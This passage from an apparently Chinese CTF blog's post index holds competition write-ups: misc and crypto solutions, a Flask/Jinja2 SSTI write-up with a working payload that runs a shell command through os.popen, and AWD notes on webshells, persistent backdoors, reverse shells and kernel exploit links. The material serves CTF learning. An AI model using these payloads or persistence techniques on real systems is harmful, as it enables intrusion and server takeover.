(OK)\nalternative: wXxLr6 (OK)\na1andns@a1andns-PC:~/Downloads/crc32-master$ php -r \"var_dump(hex2bin('70686572'));\"\nstring(4) \"pher\"\n\n\n拼接得到压缩包密码：\nthe_password_here_cipher\n\n解压压缩包,读取flag.txt\n\nCMISCCTF&#123;how_to_burp_by_coding&#125;\n\nMisc-qrcode解压文件得到一个缺了一般的qrcode。\n使用在线二维码修复网站，修复二维码，二维码的版本是4,尺寸33x33.\nhttps://merricx.github.io/qrazybox/\n挺好用的，imort半张二维码，自动不全角标，然后就只要根据二维码规则，补一下。\n\n继续处理，把灰色的底色改成白色，提高一下对比度。\n\n补好二维码，后导出如下：\n\n在这个网站有二维码扫描功能extract QR Information，提取二维码数据。\n得到flag：\n\nCMISCCTF&#123;qr_c0de_r3c0very&#125;\n\nMisc-blind题目给了一个blind.png和一个enc.rar,但是enc.rar需要密码解压，密码应该和图片有关系，题目hint是有些时候固定的文件头尾会欺骗你，尝试找找看别的结构\n\nbinwalk分析一下blind.png文件\n\n发现还有图片，所以使用foremost去分离文件。\n\n分离出两张图片，接下来提取盲水印，多亏了题目是blind。\n# coding=utf-8\nimport cv2\nimport numpy as np\nimport random\nimport os\nfrom argparse import ArgumentParser\nALPHA = 5\n\n\ndef build_parser():\n    parser = ArgumentParser()\n    parser.add_argument('--original', dest='ori', required=True)\n    parser.add_argument('--image', dest='img', required=True)\n    parser.add_argument('--result', dest='res', required=True)\n    parser.add_argument('--alpha', dest='alpha', default=ALPHA)\n    return parser\n\ndef decode(ori_path, img_path, res_path, alpha):\n    ori = cv2.imread(ori_path)\n    img = cv2.imread(img_path)\n    ori_f = np.fft.fft2(ori)\n    img_f = np.fft.fft2(img)\n    height, width = ori.shape[0], ori.shape[1]\n    watermark = (ori_f - img_f) / alpha\n    watermark = np.real(watermark)\n    res = np.zeros(watermark.shape)\n    random.seed(height + width)\n    x = range(height / 2)\n    y = range(width)\n    random.shuffle(x)\n    random.shuffle(y)\n    for i in range(height / 2):\n        for j in range(width):\n            res[x[i]][y[j]] = watermark[i][j]\n    cv2.imwrite(res_path, res, [int(cv2.IMWRITE_JPEG_QUALITY), 100])\n\ndef main():\n    parser = build_parser()\n    options = parser.parse_args()\n    ori = options.ori\n    img = options.img\n    res = options.res\n    alpha = options.alpha\n    if not os.path.isfile(ori):\n        parser.error(\"original image %s does not exist.\" % ori)\n    if not os.path.isfile(img):\n        parser.error(\"image %s does not exist.\" % img)\n    decode(ori, img, res, alpha)\n\nif __name__ == '__main__':\n    main()\n\npython2 .\\blind.py --original 1.png --image 2.png --result res.png\n\nres.png图片隐隐约约有字，但是看不清，所以就使用stegSolve来分离通道。\n\n所以压缩包的密码就是Q@CTF@NX\n下面就去解压缩包，得到了一个ctfer.png图片。\n这张图片，我在Linux上看不了，还要用Windows虚拟机查看。\n有故事啊，binwalk安排。\n\n有两个png图片结尾信息，这说明其中很可能还有一张图片，结合题目提示文件头可能会欺骗你。找看你的第二张图片，然后补png头。\n\n找到了两个文件的交界处，把后面一张图片分离出来，存为图片。\n\n加入png头，89 50 4E 47 0D 0A 1A 0A 00 00 00 0D\n\nCMISCCTF&#123;double_picture&#125;\n\nMisc-Music解压下载文件，得到一个music.wav\n\n听也听了，没有听出什么东西来。看的话，感觉有明显高低变化，之前在gactf中也有类似的，于是，利用脚本对高低增幅来转换为二进制01，老规矩低增幅为0，搞增幅为1,然后就可以得到01二进制文件流。然后每8位二进制相当于1位十六进制数，所以做一下转化，把二进制文件流搞成16进制文件流，并且写入文件。\nimport numpy as np\nimport struct\nimport wave\nimport re\n\n\ndef write_records(records, format, f):\n    record_struct = Struct(format)\n    for r in records:\n        f.write(record_struct.pack(*r))\n\npath = \"./music.wav\"\nf = wave.open(path, \"rb\")\nparams = f.getparams()\nnchannels, sampwidth, framerate, nframes = params[:4]\nstr_data = f.readframes(nframes)\nf.close()\nwave_data = np.fromstring(str_data, dtype=np.short)\nb = ''\nd = ''\nmax = 0\nfor i in wave_data:\n    if i &lt;0:\n        if max !=0:\n            if max&lt;25000:\n                d +='0'\n            else:\n                d += '1'\n                pass\n        max = 0\n    if max &lt; i:\n        max = i\n\nprint(d)\nprint(\"\\n\\n\\n\\n\")\na = re.findall(r'.&#123;8&#125;',d)\nhex_list=[]\nfor i in a:\n    res = hex(int(i,2))\n    hex_list.append(res)\nprint(hex_list)\n\nwith open(\"result.txt\",\"wb\") as f:\n    for x in hex_list:\n        s = struct.pack('B',int(x,16))\n        f.write(s)\n\n\n打开看一下,发现是乱码，但是掺杂的一些正常的字符，于是我使用binwalk分析一下，发现是一个rar文件。所以就修改文件后缀为.rar\n\n打开一看什么都没有，有点难受，压缩包里也没有其他的文件了。说明可能还有和文件流有关的东西。这里考虑是不是NTFS文件流隐写。\n\nntfs工具还是有一些的，不过收费的就算了 ，用ntfsStreamsEditor扫描nnnnoflag.txt目录\n\n导出半张二维码\n\n怀疑会不是故意修改了长高来隐藏一半文件。\n\n修改一手长高,保存一手\n然后它就正常了。\n\n扫描二维码得到flag：\nflag&#123;4dcfda814ec9fd4761c1139fee3f65eb&#125;\n\nCrypto-Round题目给了一串字符串:D@J::K=r&lt;ecXi^\\[V:X\\jXit\n移位密码\nc=':D@J::K=r&lt;ecXi^\\[V:X\\jXit'\n\na=ord(':')-ord('C')\nflag=''\nfor i in c:\n    temp=chr((ord(i)-a)%126)\n    flag+=temp\n\nprint(flag)\n\n\nCMISCCTF&#123;Enlarged_Caesar&#125;\n","slug":"2020黑盾杯题目记录","date":"2020-09-30T04:20:07.000Z","categories_index":"CTF","tags_index":"黑盾杯,MISC,CTF","author_index":"A1andNS"},{"id":"7bb41472be4b9537a699ed5c75c69f9c","title":"巅峰极客之flask","content":"在巅峰极客杯的WEB题目中有一题flask的题目，这是一题很基础的SSTI题目，涉及的是flask框架注入\n首先先登陆，随意输入大于４个字符的用户名就好了，无所谓．\n然后会自动转到一个hello xxx！的页面，可以看到关键点在于这个name参数．所以我从name参数入手，通过尝试发现?name=49，会被执行，显hello 49!\n所以可以开始整活了．先看看有哪些子类吧！\npayload:\n?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()&#125;&#125;\n\n得到了很多之类信息，不过不太好看，因为有unicode编码了&lt;&gt;符号，所以不太舒服，需要处理一下再看．\n[&lt;class 'type'>, &lt;class 'weakref'>, &lt;class 'weakcallableproxy'>, &lt;class 'weakproxy'>, &lt;class 'int'>, &lt;class 'bytearray'>, &lt;class 'bytes'>, &lt;class 'list'>, &lt;class 'NoneType'>, &lt;class 'NotImplementedType'>, &lt;class 'traceback'>, &lt;class 'super'>, &lt;class 'range'>, &lt;class 'dict'>, &lt;class 'dict_keys'>, &lt;class 'dict_values'>, &lt;class 'dict_items'>, &lt;class 'odict_iterator'>, &lt;class 'set'>, &lt;class 'str'>, &lt;class 'slice'>, &lt;class 'staticmethod'>, &lt;class 'complex'>, &lt;class 'float'>, &lt;class 'frozenset'>, &lt;class 'property'>, &lt;class 'managedbuffer'>, &lt;class 'memoryview'>, &lt;class 'tuple'>, &lt;class 'enumerate'>, &lt;class 'reversed'>, &lt;class 'stderrprinter'>, &lt;class 'code'>, &lt;class 'frame'>, &lt;class 'builtin_function_or_method'>, &lt;class 'method'>, &lt;class 'function'>, &lt;class 'mappingproxy'>, &lt;class 'generator'>, &lt;class 'getset_descriptor'>, &lt;class 'wrapper_descriptor'>, &lt;class 'method-wrapper'>, &lt;class 'ellipsis'>, &lt;class 'member_descriptor'>, &lt;class 'types.SimpleNamespace'>, &lt;class 'PyCapsule'>, &lt;class 'longrange_iterator'>, &lt;class 'cell'>, &lt;class 'instancemethod'>, &lt;class 'classmethod_descriptor'>, &lt;class 'method_descriptor'>, &lt;class 'callable_iterator'>, &lt;class 'iterator'>, &lt;class 'coroutine'>, &lt;class 'coroutine_wrapper'>, &lt;class 'EncodingMap'>, &lt;class 'fieldnameiterator'>, &lt;class 'formatteriterator'>, &lt;class 'filter'>, &lt;class 'map'>, &lt;class 'zip'>, &lt;class 'moduledef'>, &lt;class 'module'>, &lt;class 'BaseException'>, &lt;class '_frozen_importlib._ModuleLock'>, &lt;class '_frozen_importlib._DummyModuleLock'>, &lt;class '_frozen_importlib._ModuleLockManager'>, &lt;class '_frozen_importlib._installed_safely'>, &lt;class '_frozen_importlib.ModuleSpec'>, &lt;class '_frozen_importlib.BuiltinImporter'>, &lt;class 'classmethod'>, &lt;class '_frozen_importlib.FrozenImporter'>, &lt;class '_frozen_importlib._ImportLockContext'>, &lt;class '_thread._localdummy'>, &lt;class '_thread._local'>, &lt;class '_thread.lock'>, &lt;class '_thread.RLock'>, &lt;class '_frozen_importlib_external.WindowsRegistryFinder'>, &lt;class '_frozen_importlib_external._LoaderBasics'>, &lt;class '_frozen_importlib_external.FileLoader'>, &lt;class '_frozen_importlib_external._NamespacePath'>, &lt;class '_frozen_importlib_external._NamespaceLoader'>, &lt;class '_frozen_importlib_external.PathFinder'>, &lt;class '_frozen_importlib_external.FileFinder'>, &lt;class '_io._IOBase'>, &lt;class '_io._BytesIOBuffer'>, &lt;class '_io.IncrementalNewlineDecoder'>, &lt;class 'posix.ScandirIterator'>, &lt;class 'posix.DirEntry'>, &lt;class 'zipimport.zipimporter'>, &lt;class 'codecs.Codec'>, &lt;class 'codecs.IncrementalEncoder'>, &lt;class 'codecs.IncrementalDecoder'>, &lt;class 'codecs.StreamReaderWriter'>, &lt;class 'codecs.StreamRecoder'>, &lt;class '_weakrefset._IterationGuard'>, &lt;class '_weakrefset.WeakSet'>, &lt;class 'abc.ABC'>, &lt;class 'collections.abc.Hashable'>, &lt;class 'collections.abc.Awaitable'>, &lt;class 'collections.abc.AsyncIterable'>, &lt;class 'async_generator'>, &lt;class 'collections.abc.Iterable'>, &lt;class 'bytes_iterator'>, &lt;class 'bytearray_iterator'>, &lt;class 'dict_keyiterator'>, &lt;class 'dict_valueiterator'>, &lt;class 'dict_itemiterator'>, &lt;class 'list_iterator'>, &lt;class 'list_reverseiterator'>, &lt;class 'range_iterator'>, &lt;class 'set_iterator'>, &lt;class 'str_iterator'>, &lt;class 'tuple_iterator'>, &lt;class 'collections.abc.Sized'>, &lt;class 'collections.abc.Container'>, &lt;class 'collections.abc.Callable'>, &lt;class 'os._wrap_close'>, &lt;class '_sitebuiltins.Quitter'>, &lt;class '_sitebuiltins._Printer'>, &lt;class '_sitebuiltins._Helper'>, &lt;class 'types.DynamicClassAttribute'>, &lt;class 'functools.partial'>, &lt;class 'functools._lru_cache_wrapper'>, &lt;class 'operator.itemgetter'>, &lt;class 'operator.attrgetter'>, &lt;class 'operator.methodcaller'>, &lt;class 'itertools.accumulate'>, &lt;class 'itertools.combinations'>, &lt;class 'itertools.combinations_with_replacement'>, &lt;class 'itertools.cycle'>, &lt;class 'itertools.dropwhile'>, &lt;class 'itertools.takewhile'>, &lt;class 'itertools.islice'>, &lt;class 'itertools.starmap'>, &lt;class 'itertools.chain'>, &lt;class 'itertools.compress'>, &lt;class 'itertools.filterfalse'>, &lt;class 'itertools.count'>, &lt;class 'itertools.zip_longest'>, &lt;class 'itertools.permutations'>, &lt;class 'itertools.product'>, &lt;class 'itertools.repeat'>, &lt;class 'itertools.groupby'>, &lt;class 'itertools._grouper'>, &lt;class 'itertools._tee'>, &lt;class 'itertools._tee_dataobject'>, &lt;class 'reprlib.Repr'>, &lt;class 'collections.deque'>, &lt;class '_collections._deque_iterator'>, &lt;class '_collections._deque_reverse_iterator'>, &lt;class 'collections._Link'>, &lt;class 'weakref.finalize._Info'>, &lt;class 'weakref.finalize'>, &lt;class 'functools.partialmethod'>, &lt;class 'types._GeneratorWrapper'>, &lt;class 'enum.auto'>, &lt;enum 'Enum'>, &lt;class '_sre.SRE_Pattern'>, &lt;class '_sre.SRE_Match'>, &lt;class '_sre.SRE_Scanner'>, &lt;class 'sre_parse.Pattern'>, &lt;class 'sre_parse.SubPattern'>, &lt;class 'sre_parse.Tokenizer'>, &lt;class 're.Scanner'>, &lt;class 'string.Template'>, &lt;class 'string.Formatter'>, &lt;class 'markupsafe._MarkupEscapeHelper'>, &lt;class 'warnings.WarningMessage'>, &lt;class 'warnings.catch_warnings'>, &lt;class 'zlib.Compress'>, &lt;class 'zlib.Decompress'>, &lt;class 'tokenize.Untokenizer'>, &lt;class 'traceback.FrameSummary'>, &lt;class 'traceback.TracebackException'>, &lt;class 'threading._RLock'>, &lt;class 'threading.Condition'>, &lt;class 'threading.Semaphore'>, &lt;class 'threading.Event'>, &lt;class 'threading.Barrier'>, &lt;class 'threading.Thread'>, &lt;class '_bz2.BZ2Compressor'>, &lt;class '_bz2.BZ2Decompressor'>, &lt;class '_lzma.LZMACompressor'>, &lt;class '_lzma.LZMADecompressor'>, &lt;class '_hashlib.HASH'>, &lt;class '_blake2.blake2b'>, &lt;class '_blake2.blake2s'>, &lt;class '_sha3.sha3_224'>, &lt;class '_sha3.sha3_256'>, &lt;class '_sha3.sha3_384'>, &lt;class '_sha3.sha3_512'>, &lt;class '_sha3.shake_128'>, &lt;class '_sha3.shake_256'>, &lt;class '_random.Random'>, &lt;class 'tempfile._RandomNameSequence'>, &lt;class 'tempfile._TemporaryFileCloser'>, &lt;class 'tempfile._TemporaryFileWrapper'>, &lt;class 'tempfile.SpooledTemporaryFile'>, &lt;class 'tempfile.TemporaryDirectory'>, &lt;class 'Struct'>, &lt;class 'pickle._Framer'>, &lt;class 'pickle._Unframer'>, &lt;class 'pickle._Pickler'>, &lt;class 'pickle._Unpickler'>, &lt;class '_pickle.Unpickler'>, &lt;class '_pickle.Pickler'>, &lt;class '_pickle.Pdata'>, &lt;class '_pickle.PicklerMemoProxy'>, &lt;class '_pickle.UnpicklerMemoProxy'>, &lt;class 'urllib.parse._ResultMixinStr'>, &lt;class 'urllib.parse._ResultMixinBytes'>, &lt;class 'urllib.parse._NetlocResultMixinBase'>, &lt;class '_json.Scanner'>, &lt;class '_json.Encoder'>, &lt;class 'json.decoder.JSONDecoder'>, &lt;class 'json.encoder.JSONEncoder'>, &lt;class 'jinja2.utils.MissingType'>, &lt;class 'jinja2.utils.LRUCache'>, &lt;class 'jinja2.utils.Cycler'>, &lt;class 'jinja2.utils.Joiner'>, &lt;class 'jinja2.utils.Namespace'>, &lt;class 'jinja2.bccache.Bucket'>, &lt;class 'jinja2.bccache.BytecodeCache'>, &lt;class 'jinja2.nodes.EvalContext'>, &lt;class 'jinja2.nodes.Node'>, &lt;class 'jinja2.visitor.NodeVisitor'>, &lt;class 'jinja2.idtracking.Symbols'>, &lt;class '__future__._Feature'>, &lt;class 'jinja2.compiler.MacroRef'>, &lt;class 'jinja2.compiler.Frame'>, &lt;class 'jinja2.runtime.TemplateReference'>, &lt;class 'jinja2.runtime.Context'>, &lt;class 'jinja2.runtime.BlockReference'>, &lt;class 'jinja2.runtime.LoopContext'>, &lt;class 'jinja2.runtime.Macro'>, &lt;class 'jinja2.runtime.Undefined'>, &lt;class 'decimal.Decimal'>, &lt;class 'decimal.Context'>, &lt;class 'decimal.SignalDictMixin'>, &lt;class 'decimal.ContextManager'>, &lt;class 'numbers.Number'>, &lt;class '_ast.AST'>, &lt;class 'ast.NodeVisitor'>, &lt;class 'jinja2.lexer.Failure'>, &lt;class 'jinja2.lexer.TokenStreamIterator'>, &lt;class 'jinja2.lexer.TokenStream'>, &lt;class 'jinja2.lexer.Lexer'>, &lt;class 'jinja2.parser.Parser'>, &lt;class 'jinja2.environment.Environment'>, &lt;class 'jinja2.environment.Template'>, &lt;class 'jinja2.environment.TemplateModule'>, &lt;class 'jinja2.environment.TemplateExpression'>, &lt;class 'jinja2.environment.TemplateStream'>, &lt;class 'jinja2.loaders.BaseLoader'>, &lt;class 'select.poll'>, &lt;class 'select.epoll'>, &lt;class 'selectors.BaseSelector'>, &lt;class '_socket.socket'>, &lt;class 'datetime.date'>, &lt;class 'datetime.timedelta'>, &lt;class 'datetime.time'>, &lt;class 'datetime.tzinfo'>, &lt;class 'dis.Bytecode'>, &lt;class 'inspect.BlockFinder'>, &lt;class 'inspect._void'>, &lt;class 'inspect._empty'>, &lt;class 'inspect.Parameter'>, &lt;class 'inspect.BoundArguments'>, &lt;class 'inspect.Signature'>, &lt;class 'logging.LogRecord'>, &lt;class 'logging.PercentStyle'>, &lt;class 'logging.Formatter'>, &lt;class 'logging.BufferingFormatter'>, &lt;class 'logging.Filter'>, &lt;class 'logging.Filterer'>, &lt;class 'logging.PlaceHolder'>, &lt;class 'logging.Manager'>, &lt;class 'logging.LoggerAdapter'>, &lt;class 'werkzeug._internal._Missing'>, &lt;class 'werkzeug._internal._DictAccessorProperty'>, &lt;class 'importlib.abc.Finder'>, &lt;class 'importlib.abc.Loader'>, &lt;class 'contextlib.ContextDecorator'>, &lt;class 'pkgutil.ImpImporter'>, &lt;class 'pkgutil.ImpLoader'>, &lt;class 'werkzeug.utils.HTMLBuilder'>, &lt;class 'werkzeug.exceptions.Aborter'>, &lt;class 'werkzeug.urls.Href'>, &lt;class 'socketserver.BaseServer'>, &lt;class 'socketserver.ForkingMixIn'>, &lt;class 'socketserver.ThreadingMixIn'>, &lt;class 'socketserver.BaseRequestHandler'>, &lt;class 'calendar._localized_month'>, &lt;class 'calendar._localized_day'>, &lt;class 'calendar.Calendar'>, &lt;class 'calendar.different_locale'>, &lt;class 'email._parseaddr.AddrlistClass'>, &lt;class 'email.charset.Charset'>, &lt;class 'email.header.Header'>, &lt;class 'email.header._ValueFormatter'>, &lt;class 'email._policybase._PolicyBase'>, &lt;class 'email.feedparser.BufferedSubFile'>, &lt;class 'email.feedparser.FeedParser'>, &lt;class 'email.parser.Parser'>, &lt;class 'email.parser.BytesParser'>, &lt;class 'email.message.Message'>, &lt;class 'http.client.HTTPConnection'>, &lt;class 'ipaddress._IPAddressBase'>, &lt;class 'ipaddress._BaseV4'>, &lt;class 'ipaddress._IPv4Constants'>, &lt;class 'ipaddress._BaseV6'>, &lt;class 'ipaddress._IPv6Constants'>, &lt;class 'textwrap.TextWrapper'>, &lt;class '_ssl._SSLContext'>, &lt;class '_ssl._SSLSocket'>, &lt;class '_ssl.MemoryBIO'>, &lt;class '_ssl.Session'>, &lt;class 'ssl.SSLObject'>, &lt;class 'mimetypes.MimeTypes'>, &lt;class 'gettext.NullTranslations'>, &lt;class 'argparse._AttributeHolder'>, &lt;class 'argparse.HelpFormatter._Section'>, &lt;class 'argparse.HelpFormatter'>, &lt;class 'argparse.FileType'>, &lt;class 'argparse._ActionsContainer'>, &lt;class 'click._compat._FixupStream'>, &lt;class 'click._compat._AtomicFile'>, &lt;class 'click.utils.LazyFile'>, &lt;class 'click.utils.KeepOpenFile'>, &lt;class 'click.utils.PacifyFlushWrapper'>, &lt;class 'click.parser.Option'>, &lt;class 'click.parser.Argument'>, &lt;class 'click.parser.ParsingState'>, &lt;class 'click.parser.OptionParser'>, &lt;class 'click.types.ParamType'>, &lt;class 'click.formatting.HelpFormatter'>, &lt;class 'click.core.Context'>, &lt;class 'click.core.BaseCommand'>, &lt;class 'click.core.Parameter'>, &lt;class 'werkzeug.serving.WSGIRequestHandler'>, &lt;class 'werkzeug.serving._SSLContext'>, &lt;class 'werkzeug.serving.BaseWSGIServer'>, &lt;class 'werkzeug.datastructures.ImmutableListMixin'>, &lt;class 'werkzeug.datastructures.ImmutableDictMixin'>, &lt;class 'werkzeug.datastructures.UpdateDictMixin'>, &lt;class 'werkzeug.datastructures.ViewItems'>, &lt;class 'werkzeug.datastructures._omd_bucket'>, &lt;class 'werkzeug.datastructures.Headers'>, &lt;class 'werkzeug.datastructures.ImmutableHeadersMixin'>, &lt;class 'werkzeug.datastructures.IfRange'>, &lt;class 'werkzeug.datastructures.Range'>, &lt;class 'werkzeug.datastructures.ContentRange'>, &lt;class 'werkzeug.datastructures.FileStorage'>, &lt;class 'urllib.request.Request'>, &lt;class 'urllib.request.OpenerDirector'>, &lt;class 'urllib.request.BaseHandler'>, &lt;class 'urllib.request.HTTPPasswordMgr'>, &lt;class 'urllib.request.AbstractBasicAuthHandler'>, &lt;class 'urllib.request.AbstractDigestAuthHandler'>, &lt;class 'urllib.request.URLopener'>, &lt;class 'urllib.request.ftpwrapper'>, &lt;class 'werkzeug.wrappers.accept.AcceptMixin'>, &lt;class 'werkzeug.wrappers.auth.AuthorizationMixin'>, &lt;class 'werkzeug.wrappers.auth.WWWAuthenticateMixin'>, &lt;class 'werkzeug.wsgi.ClosingIterator'>, &lt;class 'werkzeug.wsgi.FileWrapper'>, &lt;class 'werkzeug.wsgi._RangeWrapper'>, &lt;class 'werkzeug.formparser.FormDataParser'>, &lt;class 'werkzeug.formparser.MultiPartParser'>, &lt;class 'werkzeug.wrappers.base_request.BaseRequest'>, &lt;class 'werkzeug.wrappers.base_response.BaseResponse'>, &lt;class 'werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin'>, &lt;class 'werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin'>, &lt;class 'werkzeug.wrappers.etag.ETagRequestMixin'>, &lt;class 'werkzeug.wrappers.etag.ETagResponseMixin'>, &lt;class 'werkzeug.wrappers.cors.CORSRequestMixin'>, &lt;class 'werkzeug.wrappers.cors.CORSResponseMixin'>, &lt;class 'werkzeug.useragents.UserAgentParser'>, &lt;class 'werkzeug.useragents.UserAgent'>, &lt;class 'werkzeug.wrappers.user_agent.UserAgentMixin'>, &lt;class 'werkzeug.wrappers.request.StreamOnlyMixin'>, &lt;class 'werkzeug.wrappers.response.ResponseStream'>, &lt;class 'werkzeug.wrappers.response.ResponseStreamMixin'>, &lt;class 'http.cookiejar.Cookie'>, &lt;class 'http.cookiejar.CookiePolicy'>, &lt;class 'http.cookiejar.Absent'>, &lt;class 'http.cookiejar.CookieJar'>, &lt;class 'werkzeug.test._TestCookieHeaders'>, &lt;class 'werkzeug.test._TestCookieResponse'>, &lt;class 'werkzeug.test.EnvironBuilder'>, &lt;class 'werkzeug.test.Client'>, &lt;class 'uuid.UUID'>, &lt;class 'CArgObject'>, &lt;class '_ctypes.CThunkObject'>, &lt;class '_ctypes._CData'>, &lt;class '_ctypes.CField'>, &lt;class '_ctypes.DictRemover'>, &lt;class 'ctypes.CDLL'>, &lt;class 'ctypes.LibraryLoader'>, &lt;class 'subprocess.CompletedProcess'>, &lt;class 'subprocess.Popen'>, &lt;class 'itsdangerous._json._CompactJSON'>, &lt;class 'hmac.HMAC'>, &lt;class 'itsdangerous.signer.SigningAlgorithm'>, &lt;class 'itsdangerous.signer.Signer'>, &lt;class 'itsdangerous.serializer.Serializer'>, &lt;class 'itsdangerous.url_safe.URLSafeSerializerMixin'>, &lt;class 'flask._compat._DeprecatedBool'>, &lt;class 'werkzeug.local.Local'>, &lt;class 'werkzeug.local.LocalStack'>, &lt;class 'werkzeug.local.LocalManager'>, &lt;class 'werkzeug.local.LocalProxy'>, &lt;class 'difflib.SequenceMatcher'>, &lt;class 'difflib.Differ'>, &lt;class 'difflib.HtmlDiff'>, &lt;class 'pprint._safe_key'>, &lt;class 'pprint.PrettyPrinter'>, &lt;class 'werkzeug.routing.RuleFactory'>, &lt;class 'werkzeug.routing.RuleTemplate'>, &lt;class 'werkzeug.routing.BaseConverter'>, &lt;class 'werkzeug.routing.Map'>, &lt;class 'werkzeug.routing.MapAdapter'>, &lt;class 'flask.signals.Namespace'>, &lt;class 'flask.signals._FakeSignal'>, &lt;class 'flask.helpers.locked_cached_property'>, &lt;class 'flask.helpers._PackageBoundObject'>, &lt;class 'flask.cli.DispatchingApp'>, &lt;class 'flask.cli.ScriptInfo'>, &lt;class 'flask.config.ConfigAttribute'>, &lt;class 'flask.ctx._AppCtxGlobals'>, &lt;class 'flask.ctx.AppContext'>, &lt;class 'flask.ctx.RequestContext'>, &lt;class 'flask.json.tag.JSONTag'>, &lt;class 'flask.json.tag.TaggedJSONSerializer'>, &lt;class 'flask.sessions.SessionInterface'>, &lt;class 'werkzeug.wrappers.json._JSONModule'>, &lt;class 'werkzeug.wrappers.json.JSONMixin'>, &lt;class 'flask.blueprints.BlueprintSetupState'>, &lt;class 'unicodedata.UCD'>, &lt;class 'jinja2.ext.Extension'>, &lt;class 'jinja2.ext._CommentFinder'>]\n\n这么多，我们要在里面寻找一个有用的东西，这里直接在浏览器里查找os，发现了一个可以利用的类os._wrap_close,现在问题就是定位一下他在哪个位置了．\nls = [] #这里就没有填进去了\ncount = 0\nfor i in ls:\n    if i in [\"&lt;'class os._wrap_close'>\"]:\n    \tprint(str(count)+\" \"+i)\n    count += 1\n\n然后可以快速知道这个类的index是117．所以接下来就是\npayload:\n?name&#x3D;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[117].__init__.__global__[&#39;popen&#39;](&#39;cat &#x2F;flag&#39;).read()&#125;&#125;\n\npayload的打上去，就可以拿flag了．\n","slug":"巅峰极客之flask","date":"2020-09-29T15:24:55.000Z","categories_index":"CTF","tags_index":"CTF,WEB,SSTI,巅峰极客杯","author_index":"A1andNS"},{"id":"38fa6375660c17bc3d17395c4f749364","title":"CTF之AWD学习","content":"AWDAWD(Attack With Defence),一种CTF赛制\n三个特点:\n\n实战性:真实网络安全防护设备设施加入抽象的网络环境中,模拟政企典型网络结构\n对抗性:一种人人对抗的竞赛方式,考验参赛团队攻防兼备.\n实时性:12-48小时不等,靶机数量根据比赛而定,其实时间也是根据赛事举办方而定\n\nAWD环境\n同样的环境主机,相同的起始分数.\n\n挖掘漏洞并且攻击对手服务以取得flag来获取分数,被攻击方会被扣分\n\n修补自身服务漏洞来避免丢分.\n\n每一轮只有一个flag,每过一轮就会进行更新flag.\n\n一般安排一个人做防御,两个人做攻击.\n\n\nAWD题目类型\nsql居多\n文件包含\n各种RCE\n文件上传\n一些常见或不常见CMS框架漏洞\n\nAWD常用工具:burpsuite, sqlmap, Nmap, masscan, 御剑, dirsearch, wpscan, nc, D盾, seay, Rips, 安全狗, MobaXterm, Xshell, Xftp, 菜刀或蚁剑, chrome, firefox, 还有浏览器各种插件, hackbar, kali,Python各类库或包\n可以提前准备一些CMS的poc或exp(phpwin , phpcms, dz)\n还有各种自动化脚本的模板.\n一句话木马要准备:php,asp,aspx,jsp,内存马\n攻击思路\nssh登上就改密码,防止弱口令被利用.上WAF,注意不要让服务宕机,不然主办方check会扣分,修改mysql弱口令要注意网站配置文件同步修改,重启apache服务以生效.寻找有没有预留后门,可以直接拿flag和上传木马.可以把木马搞成隐藏文件来,提高隐蔽性.\n\n备份源码\n\n备份源码,并且利用seay或D盾来进行审计\n\n信息搜集\n上waf\n\n一些参考资料:\nAWD攻防赛之各类漏洞FIX方案\nhttps://www.freebuf.com/articles/web/208778.html\n常用命令#准备工作\n#启动sshd服务(Windows端，设置-应用-可选功能-添加openssh客户端+服务端)，服务中开启opensshd服务。\nssh &lt;-p 端口> 用户名@IP\nscp 文件路径 用户名@IP:存放路径\n#示例\nscp -r /var/www/html A1andNS@192.168.3.10:/f:/html/\ntar -zcvf web.tar.gz /var/www/html/\npkill -kill -t &lt;用户tty>\nps aux | grep pid或者进程名\n#查看已建立连接的网络连接和进程\nnetstat -antulp | grep EST\n#查看指定端口被哪个进程占用\nlsof -i:端口号 或者netstat -tunlp|grep 端口号\n#结束进程命令\nkill PID\nkillall &lt;进程名>\n#封杀某个IP或者IP段,如:\niptables -I INPUT -s . -j DROP\niptables -I INPUT -s ./ -j DROP\n#禁止从某台主机ssh访问登陆本机\niptables -t filter -A INPUT -s . -p tcp --dport -j DROP\n#备份mysql数据库\nmysqldump -u 用户名 -p 密码 数据库名 > back.sql\nmysqldump --all-database > bak.sql\n#还原mysql数据库\nmysql -u 用户名 -p 密码 数据库名 &lt; bak.sql\nfind / *.php -perm\nawk -F: /etc/passwd\ncrontab -l\n#检查所有的tcp连接数量和状态\nnetstat -ant|awk |grep |sed -e -e |sort|uniq -c|sort -rn\n#查看页面访问排名前十的IP\ncat /var/log/apache2/access.log | cut -f1 -d | sort | uniq -c | sort -k -r | head -\n#查看页面访问排名前十的url\ncat /var/log/apache2/access.log | cut -f4 -d | sort | uniq -c | sort -k -r | head -\n\n权限维持\n种植不死马\n\n反弹shell\n\n信息隐藏\n\n\n参考文章:\nhttps://www.fuzzer.xyz/2019/04/02/AWD%E7%BA%BF%E4%B8%8B%E5%87%86%E5%A4%87%E6%8C%87%E5%8D%97/\n防御要点审计再审计Linux日志存放路径: /var/log/\nApache服务日志:\n/var/log/apache2/access.log\n/var/log/apache2/error.log\n查看/var/log/wtmp文件查看可疑IP登陆\n查看/var/log/secure 文件寻找可疑IP登陆次数\n一些AWD资源https://neversec.top/20190415/how-to-awd.html\n以下内容大多来源自上面这个网址\nGithub资源\n(⭐235) AWD攻防赛脚本集合: https://github.com/admintony/Prepare-for-AWD\n(⭐124) Attack-Defense-Framework: https://github.com/SniperOJ/Attack-Defense-Framework/tree/v2\n(⭐99) AWD攻防赛webshell批量利用框架: https://github.com/Ares-X/AWD-Predator-Framework\n(⭐28) awd-frame: https://github.com/xnianq/awd-frame\n(⭐4) WEB-AWD-Framework:https://github.com/dahua966/WEB-AWD-Framework\n(⭐0) AWD-helper: https://github.com/sarleon/AWD-helper\nAWD线下脚本: https://github.com/admintony/Prepare-for-AWD\n提权exp: https://github.com/SecWiki/linux-kernel-exploits\n\nAWD经验\nCTF线下赛AWD模式下的生存技巧: https://www.anquanke.com/post/id/84675\nCTF线下赛AWD套路小结: https://xz.aliyun.com/t/25\nAWD混战攻略: https://www.jianshu.com/p/d21b7e1bffaf\nCTF线下AWD攻防模式的准备工作及起手式: https://blog.csdn.net/like98k/article/details/80261603\n2017强网杯线下AWD攻防总结（适合新手）: https://www.t00ls.net/articles-42278.html\nAWD攻防线下生存之道: 